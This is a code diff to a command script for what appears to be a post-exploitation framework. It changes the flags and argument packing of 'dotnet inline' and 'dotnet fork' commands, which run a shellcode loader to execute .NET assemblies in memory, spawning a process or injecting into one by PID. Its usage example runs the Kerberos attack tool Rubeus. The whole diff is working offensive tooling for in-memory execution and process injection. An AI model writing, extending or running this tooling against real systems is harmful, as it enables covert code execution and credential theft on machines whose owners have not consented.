@@ -104,37 +104,33 @@ cmd_dotnet_inline.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
     let app_domain = parsed_json["app_domain"] || "RndDomain";
     let dotnet_version = parsed_json["dotnet_version"] || "v0.0.00000";
 
-    let keepload = 0;
-
-    let mod_params = ax.bof_pack("bytes,cstr,cstr,cstr,int", [dotnet_file, args, app_domain, dotnet_version, keepload]);
-    let mod_path = ax.script_dir() + "Shellcode/Dotnet/Bin/dotnet_assembly." + ax.arch(id) + ".bin";
+    let mod_params = ax.bof_pack("wstr,wstr,wstr,bytes", [args, app_domain, dotnet_version, dotnet_file]);
+    let mod_path = ax.script_dir() + "postex_sc/dotnet_ldr/Bin/dotnet_assembly." + ax.arch(id) + ".bin";
     let message = `Task: executing .NET assembly in-memory`;
 
-    ax.execute_alias(id, cmdline, `execute postex -m inline -f ${mod_path} -a ${mod_params}`, message);
+    ax.execute_alias(id, cmdline, `execute postex --file ${mod_path} --args ${mod_params}`, message);
 });
 
 let cmd_dotnet_fork = ax.create_command("fork", "Execute .NET assembly in-process spawning or injecting in the existence process", "dotnet fork -m spawn -f /tmp/Rubeus.exe -a \"kerberos\" -d RndDomain -v v4.0.30319", "Task: execute .NET assembly inline");
-cmd_dotnet_fork.addArgFlagString("-m", "fork_method", false, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
-cmd_dotnet_fork.addArgFlagInt("-P", "fork_pid", false, "Pid to use for inject in the explicit method");
+cmd_dotnet_fork.addArgFlagString("-m", "method", false, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
+cmd_dotnet_fork.addArgFlagInt("-P", "pid", false, "Pid to use for inject in the explicit method");
 cmd_dotnet_fork.addArgFlagFile("-f", "dotnet_file", true, ".NET assembly file");
 cmd_dotnet_fork.addArgFlagString("-a", "args", false, "Assembly arguments");
 cmd_dotnet_fork.addArgFlagString("-d", "app_domain", false, "Application domain name");
 cmd_dotnet_fork.addArgFlagString("-v", "dotnet_version", false, ".NET version");
 cmd_dotnet_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let fork_method = parsed_json["fork_method"];
-    let fork_pid = parsed_json["fork_pid"];
+    let method = parsed_json["method"];
+    let fork_pid = parsed_json["pid"];
     let dotnet_file = parsed_json["dotnet_file"];
     let args = parsed_json["args"] || "";
     let app_domain = parsed_json["app_domain"] || "RndDomain";
     let dotnet_version = parsed_json["dotnet_version"] || "v0.0.00000";
 
-    let keepload = 0;
-
-    let mod_params = ax.bof_pack("bytes,cstr,cstr,cstr,int", [dotnet_file, args, app_domain, dotnet_version, keepload]);
+    let mod_params = ax.bof_pack("bytes,wstr,wstr,wstr", [dotnet_file, args, app_domain, dotnet_version]);
     let mod_path = ax.script_dir() + "Shellcode/Dotnet/Bin/dotnet_assembly." + ax.arch(id) + ".bin";
     let message = `Task: executing .NET assembly in-memory`;
 
-    ax.execute_alias(id, cmdline, `execute postex -m fork -t ${fork_method} -p ${fork_pid} -f ${mod_path} -a ${mod_params}`, message);
+    ax.execute_alias(id, cmdline, `execute postex --method ${method} --pid ${fork_pid} --file ${mod_path} --args ${mod_params}`, message);
 });
 
 let cmd_dotnet = ax.create_command("dotnet", ".NET Framework operations - execute assemblies and enumerate versions");
